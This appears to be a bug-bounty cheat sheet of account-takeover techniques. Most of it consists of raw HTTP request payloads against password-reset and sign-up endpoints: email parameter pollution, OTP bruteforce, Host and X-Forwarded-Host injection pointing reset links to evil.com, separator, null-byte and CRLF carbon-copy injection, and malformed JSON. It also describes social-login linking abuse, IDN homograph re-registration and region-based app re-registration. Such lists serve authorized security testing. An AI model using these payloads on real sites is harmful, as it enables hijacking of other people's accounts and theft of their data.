## Account Takeover

1. Parameter pollution in reset password
```
POST /reset
[...]
email=victim@mail.com&email=hacker@mail.com
```

2. Bruteforce the OTP code
```
POST /reset
[...]
email=victim@mail.com&code=$123456$
```

3. Host header Injection
```
POST /reset
Host: evil.com
[...]
email=victim@mail.com
```
```
POST /reset
Host: target.com
X-Forwarded-Host: evil.com
[...]
email=victim@mail.com
```
And the victim will receive the reset link with evil.com

4. Using separator in value of the parameter
```
POST /reset
[...]
email=victim@mail.com,hacker@mail.com
```
```
POST /reset
[...]
email=victim@mail.com%20hacker@mail.com
```
```
POST /reset
[...]
email=victim@mail.com|hacker@mail.com
```
```
POST /reset
[...]
email=victim@mail.com%00hacker@mail.com
```

5. No domain in value of the paramter
```
POST /reset
[...]
email=victim
```

6. No TLD in value of the parameter
```
POST /reset
[...]
email=victim@mail
```

7. Using carbon copy
```
POST /reset
[...]
email=victim@mail.com%0a%0dcc:hacker@mail.com
```

8. Try re-sign up using same email
```
POST /newaccount
[...]
email=victim@mail.com&password=1234
```
After sign up using victim email, try signup again but using different password
```
POST /newaccount
[...]
email=victim@mail.com&password=hacked
```

9. If there is JSON data in body requests, add comma
```
POST /newaccount
[...]
{“email”:“victim@mail.com”,”hacker@mail.com”,“token”:”xxxxxxxxxx”}
```

10. Find out how the tokens generate
- Generated based on TimeStamp
- Generated based on the ID of the user
- Generated based on the email of the user
- Generated based on the name of the user
> [For Example](https://medium.com/bugbountywriteup/how-i-discovered-an-interesting-account-takeover-flaw-18a7fb1e5359)

11. Account takeover after login (Work if inside the website there is "Connect to facebook/twitter/etc")
  - First, login to the website using victim email
  - Find "Connect to facebook/twitter/googleplus" or something like that ![Photo](https://miro.medium.com/max/875/0*LOrCFhQF9-KPALPg.png)]
  - Connect to attacker twitter
  - After logout you can login using the twitter

12. ## Account Takeover Scenario :

## Test Sign-Up Panel

### Try to re- register yourself with same email id as you use before, sometimes unexpected things can happend

1. While doing sign-up with same email id, try to add space after email id e.g. ```victim@gmail.com{space_here}     ``` without angle brackets

2. ```victim@gmail.com%00``` Here i am using Null byte, but i found that many applications accept Null byte in email & they treat it different email form this one ``` victim@gmail.com```, but sometimes they convert it to ```victim@gmail.com```, so trying isn't bad, hope for the best.

3. Carefully see all the reqests in your burp suite history (But Why ),for that, this medium blog is worth to read: 

https://medium.com/@zseano/how-re-signing-up-for-an-account-lead-to-account-takeover-3a63a628fd9f

4. IDN homograph attack: if your registered email id is victim@gmail.com then try to re-register yourself with vicitm@gmail.cÖm, here i replace O with turkish Ö, if a website is vunrable to homograph attack then you can access victim account, you can try same trick for username also ( many website ask for unique username where you can't use any already taken username ),i highly recommended you to read this awesome article  about this kind of vunerabilty :

https://medium.com/bugbountywriteup/how-i-was-able-to-change-victims-password-using-idn-homograph-attack-587111843aff

5. After registering through website try to re-register same email with their android/ios apps, magic can happned anywhere

6. Sometimes target use region based sign-up in region based android/ios apps, register yourself with asia based app after downloading it through app store (android/ios), then by using VPN change the region to US and download their US region based app, again register yourself with same mail id, you will access the same account with your new password.
